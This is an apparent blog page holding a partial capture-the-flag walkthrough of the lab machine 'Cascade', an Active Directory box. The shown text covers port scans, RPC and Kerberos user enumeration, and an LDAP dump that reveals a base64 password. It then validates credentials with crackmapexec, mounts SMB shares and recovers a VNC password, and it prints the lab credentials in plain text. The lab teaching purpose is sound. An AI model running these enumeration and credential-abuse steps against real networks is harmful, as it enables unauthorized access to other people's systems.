@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/cascade.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/cascade.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/cascade.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="cascade">Cascade</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<ul>
+  <li>IP → 10.10.10.182</li>
+</ul>
+
+<p>Port scan reported the following ports opened.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack
+88/tcp    open  kerberos-sec     syn-ack
+135/tcp   open  msrpc            syn-ack
+139/tcp   open  netbios-ssn      syn-ack
+389/tcp   open  ldap             syn-ack
+445/tcp   open  microsoft-ds     syn-ack
+636/tcp   open  ldapssl          syn-ack
+3268/tcp  open  globalcatLDAP    syn-ack
+3269/tcp  open  globalcatLDAPssl syn-ack
+5985/tcp  open  wsman            syn-ack
+49154/tcp open  unknown          syn-ack
+49155/tcp open  unknown          syn-ack
+49157/tcp open  unknown          syn-ack
+49158/tcp open  unknown          syn-ack
+49170/tcp open  unknown          syn-ack
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server 2008 R2 SP1<span class="o">)</span>
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-11-09 14:57:32Z<span class="o">)</span>
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds? syn-ack
+636/tcp   open  tcpwrapped    syn-ack
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped    syn-ack
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49170/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: CASC-DC1<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-11-09T14:58:22
+|_  start_date: 2023-11-09T12:30:41
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled and required
+|_clock-skew: 0s
+| p2p-conficker: 
+|   Checking <span class="k">for </span>Conficker.C or higher...
+|   Check 1 <span class="o">(</span>port 51409/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 2 <span class="o">(</span>port 35700/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 3 <span class="o">(</span>port 10882/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 4 <span class="o">(</span>port 26875/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+</code></pre></div></div>
+
+<h2 id="port-445139">Port 445/139</h2>
+
+<ul>
+  <li>SMB</li>
+  <li>Need credentials</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/cascade]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.10.182 <span class="nt">-u</span> <span class="s2">"%"</span> <span class="nt">-p</span> <span class="s2">"%"</span> <span class="nt">--shares</span>
+SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>-] cascade.local<span class="se">\%</span>:% STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<h2 id="port-135">Port 135</h2>
+
+<ul>
+  <li>RPC</li>
+  <li>We have access</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/cascade/enumeration]
+└─<span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s1">'%'</span> 10.10.10.182
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[CascGuest] rid:[0x1f5]
+user:[arksvc] rid:[0x452]
+user:[s.smith] rid:[0x453]
+user:[r.thompson] rid:[0x455]
+user:[util] rid:[0x457]
+user:[j.wakefield] rid:[0x45c]
+user:[s.hickson] rid:[0x461]
+user:[j.goodhand] rid:[0x462]
+user:[a.turnbull] rid:[0x464]
+user:[e.crowe] rid:[0x467]
+user:[b.hanson] rid:[0x468]
+user:[d.burman] rid:[0x469]
+user:[BackupSvc] rid:[0x46a]
+user:[j.allen] rid:[0x46e]
+user:[i.croft] rid:[0x46f]
+</code></pre></div></div>
+
+<h2 id="port-88">Port 88</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2023/12/19 06:16:52 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       s.hickson@cascade.local
+2023/12/19 06:16:53 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       j.goodhand@cascade.local
+2023/12/19 06:16:52 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       a.turnbull@cascade.local
+2023/12/19 06:16:53 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       j.wakefield@cascade.local
+2023/12/19 06:16:53 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       r.thompson@cascade.local
+2023/12/19 06:16:56 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       util@cascade.local
+2023/12/19 06:16:56 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       s.smith@cascade.local
+2023/12/19 06:16:56 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       arksvc@cascade.local
+2023/12/19 06:16:58 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       BackupSvc@cascade.local
+2023/12/19 06:16:58 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       j.allen@cascade.local
+2023/12/19 06:16:58 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       d.burman@cascade.local
+</code></pre></div></div>
+
+<h2 id="port-386">Port 386</h2>
+
+<p>Enumerating this service we will find some uncommon fields. First we dump the entire ldap tree into a file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.182 <span class="nt">-b</span> <span class="s2">"DC=cascade,DC=local"</span> <span class="o">&gt;</span> full_tree.txt
+</code></pre></div></div>
+
+<p>To filter by this uncommon fields we can use the following command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/cascade]
+└─<span class="nv">$ </span><span class="nb">cat </span>ldap/full_tree.txt| <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s2">"^dn|^dc|^objectClass|^objectClass|^objectClass|^objectClass|^cn|^sn|^ou|^givenName|^distinguishedName|^instanceType|^whenCreated|^whenChanged|^displayName|^uSNCreated|^memberOf|^uSNChanged|^name|^objectGUID|^userAccountControl|^badPwdCount|^codePage|^countryCode|^badPasswordTime|^lastLogoff|^lastLogon|^pwdLastSet|^primaryGroupID|^objectSid|^accountExpires|^logonCount|^sAMAccountName|^sAMAccountType|^userPrincipalName|^objectCategory|^dSCorePropagationData|^dSCorePropagationData|^dSCorePropagationData|^dSCorePropagationData|^dSCorePropagationData|^lastLogonTimestamp|^msDS-SupportedEncryptionTypes|^serverReference|^showInAdvancedViewOnly|^msDFSR-DirectoryFilter|^systemFlags|^#|^msDFSR-RootPath|^msDFSR-StagingPath|^msDFSR-Enabled|^msDFSR-Options|^msDFSR-ContentSetGuid|^msDFSR-ReplicationGroupGuid|^msDFSR-ReadOnly|^lastSetTime|^priorSetTime|^isCriticalSystemObject|^fSMORoleOwner|^rIDAvailablePool|^isCriticalSystemObject|^rIDAllocationPool|^rIDPreviousAllocationPool|^rIDUsedPool|^rIDNextRID|^member|^groupType|^scriptPath|^MemberReferenceBL|^ComputerReference|^FileFilter|^ReplicationGroupType|^ref|^msDFSR-MemberReference|^msDFSR-FileFilter|^servicePrincipalName|^dNSHostName:|^rIDSetReferences|^revision|^samDomainUpdates|^localPolicyFlags|^operatingSystem|^operatingSystemVersion|^operatingSystemServicePack|^creationTime|^forceLogoff|^lockoutDuration|^lockOutObservationWindow|^lockoutThreshold|^maxPwdAge|^minPwdAge|^minPwdLength|^modifiedCountAtLastProm|^nextRid|^pwdProperties|^pwdHistoryLength|^serverState|^uASCompat|^modifiedCount|^ipsecName|^ipsecID|^ipsecDataType|^ipsecData|^iPSECNegotiationPolicyType|^iPSECNegotiationPolicyAction|^ipsecID|^ipsecDataType|^ipsecData|^ipsecOwnersReference|^auditingPolicy|^description|^gPLink|^ipsecFilterReference|^ipsecISAKMPReference|^ipsecNFAReference|^ipsecNegotiationPolicyReference|^masteredBy|^ms-DS-MachineAccountQuota|^msDFSR-ComputerReference|^msDFSR-ComputerReferenceBL|^msDFSR-Flags|^msDFSR-ReplicationGroupType|^msDFSR-Version|^msDS-AllUsersTrustQuota|^msDS-Behavior-Version|^msDS-IsDomainFor|^msDS-NcType|^msDS-PerUserTrustQuota|^msDS-PerUserTrustTombstonesQuota|^msDS-TombstoneQuotaFactor|^msDs-masteredBy|^nTMixedDomain|^otherWellKnownObjects|^rIDManagerReference|^result|^search|^subRefs|^wellKnownObjects"</span> | <span class="nb">sed</span> <span class="s1">'/^$/d'</span> | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"^.*?:"</span>
+cascadeLegacyPwd: <span class="nv">clk0bjVldmE</span><span class="o">=</span>
+</code></pre></div></div>
+
+<p>And we obtain a password. To know where this password is we can use <code class="language-plaintext highlighter-rouge">grep</code> command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/cascade]
+└─<span class="nv">$ </span><span class="nb">cat </span>ldap/full_tree.txt| <span class="nb">grep</span> <span class="nt">-A10</span> <span class="nt">-B11</span> cascadeLegacyPwd:
+sAMAccountName: r.thompson
+sAMAccountType: 805306368
+userPrincipalName: r.thompson@cascade.local
+objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
+</span>dSCorePropagationData: 20200126183918.0Z
+dSCorePropagationData: 20200119174753.0Z
+dSCorePropagationData: 20200119174719.0Z
+dSCorePropagationData: 20200119174508.0Z
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 132294360317419816
+msDS-SupportedEncryptionTypes: 0
+cascadeLegacyPwd: <span class="nv">clk0bjVldmE</span><span class="o">=</span>
+</code></pre></div></div>
+
+<p>We can see that the password is within user r.thompson section of the tree. We will decode the password and check if is correct for the user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/cascade]
+└─<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'clk0bjVldmE='</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+rY4n5eva                                                                                                                                                                                                                                           
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/cascade]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.10.182 <span class="nt">-u</span> <span class="s1">'r.thompson'</span> <span class="nt">-p</span> <span class="s1">'rY4n5eva'</span>
+SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\r</span>.thompson:rY4n5eva
+</code></pre></div></div>
+
+<p>We have credentials → <code class="language-plaintext highlighter-rouge">r.thompson:rY4n5eva</code>.</p>
+
+<h1 id="enumeration-with-credentials---rthompson">Enumeration with credentials - r.thompson</h1>
+
+<p>The service we could access before was SMB, so let’s check it now.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/cascade]
+└─<span class="nv">$ </span>smbmap <span class="nt">-H</span> 10.10.10.182 <span class="nt">-u</span> <span class="s2">"r.thompson"</span> <span class="nt">-p</span> <span class="s2">"rY4n5eva"</span> <span class="nt">-d</span> <span class="s2">"cascade.local"</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>                                
+                                                                                                    
+<span class="o">[</span>+] IP: 10.10.10.182:445        Name: cascade.local             Status: Authenticated
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
+        Audit<span class="nv">$ </span>                                                 NO ACCESS
+        C<span class="nv">$ </span>                                                     NO ACCESS       Default share
+        Data                                                    READ ONLY
+        IPC<span class="nv">$ </span>                                                   NO ACCESS       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        print<span class="nv">$ </span>                                                 READ ONLY       Printer Drivers
+        SYSVOL                                                  READ ONLY       Logon server share
+</code></pre></div></div>
+
+<p>The first share we will enumearte is <strong>Data</strong>.</p>
+
+<h3 id="data-share">Data share</h3>
+
+<p>Inside this share we can only access one resource, which is <strong>IT</strong>. We mount the share in a route of our system to navegate through it easily.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/home/kali/machines/windows/cascade]
+└─# mount <span class="nt">-t</span> cifs //10.10.10.182/Data /mnt/data_share <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span>r.thompson,password<span class="o">=</span>rY4n5eva,domain<span class="o">=</span>cascade.local
+</code></pre></div></div>
+
+<p>Now we will check the entire volume.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/mnt/data_share]
+└─# tree <span class="nt">-af</span>
+<span class="nb">.</span>
+├── ./Contractors
+├── ./Finance
+├── ./IT
+│   ├── ./IT/Email Archives
+│   │   └── ./IT/Email Archives/Meeting_Notes_June_2018.html
+│   ├── ./IT/LogonAudit
+│   ├── ./IT/Logs
+│   │   ├── ./IT/Logs/Ark AD Recycle Bin
+│   │   │   └── ./IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log
+│   │   └── ./IT/Logs/DCs
+│   │       └── ./IT/Logs/DCs/dcdiag.log
+│   └── ./IT/Temp
+│       ├── ./IT/Temp/r.thompson
+│       └── ./IT/Temp/s.smith
+│           └── ./IT/Temp/s.smith/VNC Install.reg
+├── ./Production
+└── ./Temps
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Meeting_Notes_June_2018.html</p>
+
+    <p>Checking this HTML file with a web browser we will see some interesting things.</p>
+
+    <p>Date:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  From:                                         Steve Smith
+  To:                                           IT <span class="o">(</span>Internal<span class="o">)</span>
+  Sent:                                         14 June 2018 14:07
+  Subject:                                      Meeting Notes
+</code></pre></div>    </div>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nt">--</span> We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration <span class="k">in </span>security logs etc. Username is TempAdmin <span class="o">(</span>password is the same as the normal admin account password<span class="o">)</span>
+</code></pre></div>    </div>
+
+    <p>We have a new user <code class="language-plaintext highlighter-rouge">TempAdmin</code>, which has the same password as the current admin account. Using kerbrute to see if the user exists, we can actually see that this user no longer exists in the domain.</p>
+  </li>
+  <li>
+    <p>ArkAdRecycleBin.log</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/mnt/data_share]
+  └─# <span class="nb">cat</span> <span class="s1">'./IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log'</span>
+  1/10/2018 15:43 <span class="o">[</span>MAIN_THREAD]   <span class="k">**</span> STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 <span class="k">**</span>
+  1/10/2018 15:43 <span class="o">[</span>MAIN_THREAD]   Validating settings...
+  1/10/2018 15:43 <span class="o">[</span>MAIN_THREAD]   Error: Access is denied
+  1/10/2018 15:43 <span class="o">[</span>MAIN_THREAD]   Exiting with error code 5
+  2/10/2018 15:56 <span class="o">[</span>MAIN_THREAD]   <span class="k">**</span> STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 <span class="k">**</span>
+  2/10/2018 15:56 <span class="o">[</span>MAIN_THREAD]   Validating settings...
+  2/10/2018 15:56 <span class="o">[</span>MAIN_THREAD]   Running as user CASCADE<span class="se">\A</span>rkSvc
+  2/10/2018 15:56 <span class="o">[</span>MAIN_THREAD]   Moving object to AD recycle bin <span class="nv">CN</span><span class="o">=</span>Test,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
+  </span>2/10/2018 15:56 <span class="o">[</span>MAIN_THREAD]   Successfully moved object. New location <span class="nv">CN</span><span class="o">=</span>Test<span class="se">\0</span>ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
+  </span>2/10/2018 15:56 <span class="o">[</span>MAIN_THREAD]   Exiting with error code 0
+  8/12/2018 12:22 <span class="o">[</span>MAIN_THREAD]   <span class="k">**</span> STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 <span class="k">**</span>
+  8/12/2018 12:22 <span class="o">[</span>MAIN_THREAD]   Validating settings...
+  8/12/2018 12:22 <span class="o">[</span>MAIN_THREAD]   Running as user CASCADE<span class="se">\A</span>rkSvc
+  8/12/2018 12:22 <span class="o">[</span>MAIN_THREAD]   Moving object to AD recycle bin <span class="nv">CN</span><span class="o">=</span>TempAdmin,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
+  </span>8/12/2018 12:22 <span class="o">[</span>MAIN_THREAD]   Successfully moved object. New location <span class="nv">CN</span><span class="o">=</span>TempAdmin<span class="se">\0</span>ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
+  </span>8/12/2018 12:22 <span class="o">[</span>MAIN_THREAD]   Exiting with error code 0
+</code></pre></div>    </div>
+
+    <p>There is a software running as user <code class="language-plaintext highlighter-rouge">ArkSvc</code>. We can see that this is the user that deleted <code class="language-plaintext highlighter-rouge">TempAdmin</code> user.</p>
+  </li>
+  <li>
+    <p>dcdiag.log</p>
+
+    <p>We don’t see anything interesting here.</p>
+  </li>
+  <li>
+    <p>VNC Install.reg</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">[</span>HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\T</span>ightVNC]
+    
+  <span class="o">[</span>HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\T</span>ightVNC<span class="se">\S</span>erver]
+  <span class="s2">"ExtraPorts"</span><span class="o">=</span><span class="s2">""</span>
+  <span class="s2">"QueryTimeout"</span><span class="o">=</span>dword:0000001e
+  <span class="s2">"QueryAcceptOnTimeout"</span><span class="o">=</span>dword:00000000
+  <span class="s2">"LocalInputPriorityTimeout"</span><span class="o">=</span>dword:00000003
+  <span class="s2">"LocalInputPriority"</span><span class="o">=</span>dword:00000000
+  <span class="s2">"BlockRemoteInput"</span><span class="o">=</span>dword:00000000
+  <span class="s2">"BlockLocalInput"</span><span class="o">=</span>dword:00000000
+  <span class="s2">"IpAccessControl"</span><span class="o">=</span><span class="s2">""</span>
+  <span class="s2">"RfbPort"</span><span class="o">=</span>dword:0000170c
+  <span class="s2">"HttpPort"</span><span class="o">=</span>dword:000016a8
+  <span class="s2">"DisconnectAction"</span><span class="o">=</span>dword:00000000
+  <span class="s2">"AcceptRfbConnections"</span><span class="o">=</span>dword:00000001
+  <span class="s2">"UseVncAuthentication"</span><span class="o">=</span>dword:00000001
+  <span class="s2">"UseControlAuthentication"</span><span class="o">=</span>dword:00000000
+  <span class="s2">"RepeatControlAuthentication"</span><span class="o">=</span>dword:00000000
+  <span class="s2">"LoopbackOnly"</span><span class="o">=</span>dword:00000000
+  <span class="s2">"AcceptHttpConnections"</span><span class="o">=</span>dword:00000001
+  <span class="s2">"LogLevel"</span><span class="o">=</span>dword:00000000
+  <span class="s2">"EnableFileTransfers"</span><span class="o">=</span>dword:00000001
+  <span class="s2">"RemoveWallpaper"</span><span class="o">=</span>dword:00000001
+  <span class="s2">"UseD3D"</span><span class="o">=</span>dword:00000001
+  <span class="s2">"UseMirrorDriver"</span><span class="o">=</span>dword:00000001
+  <span class="s2">"EnableUrlParams"</span><span class="o">=</span>dword:00000001
+  <span class="s2">"Password"</span><span class="o">=</span>hex:6b,cf,2a,4b,6e,5a,ca,0f
+  <span class="s2">"AlwaysShared"</span><span class="o">=</span>dword:00000000
+  <span class="s2">"NeverShared"</span><span class="o">=</span>dword:00000000
+  <span class="s2">"DisconnectClients"</span><span class="o">=</span>dword:00000001
+  <span class="s2">"PollingInterval"</span><span class="o">=</span>dword:000003e8
+  <span class="s2">"AllowLoopback"</span><span class="o">=</span>dword:00000000
+  <span class="s2">"VideoRecognitionInterval"</span><span class="o">=</span>dword:00000bb8
+  <span class="s2">"GrabTransparentWindows"</span><span class="o">=</span>dword:00000001
+  <span class="s2">"SaveLogToAllUsersPath"</span><span class="o">=</span>dword:00000000
+  <span class="s2">"RunControlInterface"</span><span class="o">=</span>dword:00000001
+  <span class="s2">"IdleTimeout"</span><span class="o">=</span>dword:00000000
+  <span class="s2">"VideoClasses"</span><span class="o">=</span><span class="s2">""</span>
+  <span class="s2">"VideoRects"</span><span class="o">=</span><span class="s2">""</span>
+</code></pre></div>    </div>
+
+    <p>With have a password, however, if we try to decoded it directly we will notice that it is actually encrypted. A quick search on the internet will lead us to know how to retrieve the plain text password.</p>
+
+    <p>We endup with a new credential possibly for user s.smith.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/cascade]
+  └─<span class="nv">$ </span>crackmapexec smb 10.10.10.182 <span class="nt">-u</span> <span class="s1">'s.smith'</span> <span class="nt">-p</span> <span class="s1">'sT333ve2'</span>
+  SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+  SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\s</span>.smith:sT333ve2
+</code></pre></div>    </div>
+
+    <p>Credentials → <code class="language-plaintext highlighter-rouge">s.smith:sT333ve2</code></p>
+  </li>
+</ul>
+
+<h3 id="print-share">Print share</h3>
+
+<p>Empty</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/cascade]
+└─<span class="nv">$ </span>smbclient <span class="se">\\\\</span>10.10.10.182<span class="se">\\</span>print<span class="nv">$ </span><span class="nt">-U</span> <span class="s2">"cascade.local/r.thompson"</span>
+Password <span class="k">for</span> <span class="o">[</span>CASCADE.LOCAL<span class="se">\r</span>.thompson]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Tue Jul 14 07:37:10 2009
+  ..                                  D        0  Tue Jul 14 07:37:10 2009
+  color                               D        0  Tue Jul 14 07:37:10 2009
+  IA64                                D        0  Tue Jul 14 06:58:30 2009
+  W32X86                              D        0  Tue Jul 14 06:58:30 2009
+  x64                                 D        0  Mon Jan 13 04:09:11 2020
+
+                6553343 blocks of size 4096. 1625412 blocks available
+smb: <span class="se">\&gt;</span> <span class="nb">dir </span>color
+  color                               D        0  Tue Jul 14 07:37:10 2009
+
+                6553343 blocks of size 4096. 1625412 blocks available
+smb: <span class="se">\&gt;</span> <span class="nb">dir </span>IA64
+  IA64                                D        0  Tue Jul 14 06:58:30 2009
+
+                6553343 blocks of size 4096. 1625412 blocks available
+smb: <span class="se">\&gt;</span> <span class="nb">dir </span>W32X86
+  W32X86                              D        0  Tue Jul 14 06:58:30 2009
+
+                6553343 blocks of size 4096. 1625396 blocks available
+smb: <span class="se">\&gt;</span> <span class="nb">dir </span>x64
+  x64                                 D        0  Mon Jan 13 04:09:11 2020
+</code></pre></div></div>
+
+<h1 id="enumeration-with-credentials---ssmith">Enumeration with credentials - s.smith</h1>
+
+<p>We have access to a new share called <strong>Audit$</strong>. We will again mount it an check it from our file system.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/mnt/audit]
+└─# tree <span class="nt">-af</span> 
+<span class="nb">.</span>
+├── ./CascAudit.exe
+├── ./CascCrypto.dll
+├── ./DB
+│   └── ./DB/Audit.db
+├── ./RunAudit.bat
+├── ./System.Data.SQLite.EF6.dll
+├── ./System.Data.SQLite.dll
+├── ./x64
+│   └── ./x64/SQLite.Interop.dll
+└── ./x86
+    └── ./x86/SQLite.Interop.dll
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Audit.db</p>
